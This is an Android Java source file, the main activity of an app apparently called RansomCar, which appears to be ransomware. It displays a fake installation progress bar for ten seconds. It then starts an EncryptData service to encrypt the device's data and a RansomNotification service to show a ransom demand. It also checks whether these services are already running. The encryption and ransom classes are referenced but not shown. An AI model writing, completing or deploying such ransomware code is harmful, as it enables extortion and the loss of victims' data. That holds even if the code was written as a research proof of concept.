package com.example.ransomcar;


import android.os.Bundle;
import android.os.Handler;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.util.Log;
import android.view.Menu;
import android.widget.Toast;
import android.widget.ProgressBar;
//import com.example.ransomcar.R;

public class MainActivity extends Activity {

	private ProgressBar mProgress;
	private int mProgressStatus = 0;
	private Handler mHandler = new Handler();
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);

		//Simulate some work for 10 seconds
		   mProgress = (ProgressBar) findViewById(R.id.installingProgBar); 
			new Thread(new Runnable() { 
				public void run() {
					while (mProgressStatus < 100) { 
						try { Thread.sleep(100); 
						} catch (InterruptedException e) { 
							e.printStackTrace();
						} 
						mProgressStatus++; 
						// Update the progress bar 
						mHandler.post(new Runnable() { 
							public void run() { 
								mProgress.setProgress(mProgressStatus); 
							} 
						}); 
					}
					//Start Ransom message
					Log.d("RansomNotification", "starting");
					startService(new Intent(getBaseContext(), RansomNotification.class));
				}
			// progresBar starts
			}).start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}	
	
	@Override protected void onStart() { 
		super.onStart();
		
		// checking if app already running and encryption key present
		//if(isMyServiceRunning(getBaseContext()) || PhoneInfo.getMyKey().length()==16){
		if(isMyServiceRunning(getBaseContext())) {
			new Handler().postDelayed(new Runnable() { 
				@Override 
				public void run() {
					finish();
					Toast.makeText(getBaseContext(), "RansomCar is already running", Toast.LENGTH_LONG).show();
					startService(new Intent(getBaseContext(), RansomNotification.class));
				}
			}, 5000);	
		} else {
			//Encrypt service starts
			Log.d("Start encryptions process", "Start");
			Intent encryptservice = new Intent(getBaseContext(), EncryptData.class);
			startService(encryptservice);
		}
	}

	//Check if any of services are running
	public boolean isMyServiceRunning(Context context) {
	    ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if (DecryptData.class.getName().equals(service.service.getClassName())||
	        		EncryptData.class.getName().equals(service.service.getClassName())||
	        		RansomNotification.class.getName().equals(service.service.getClassName())) {
	            return true;
	        }
	    }
	    return false;
	}
}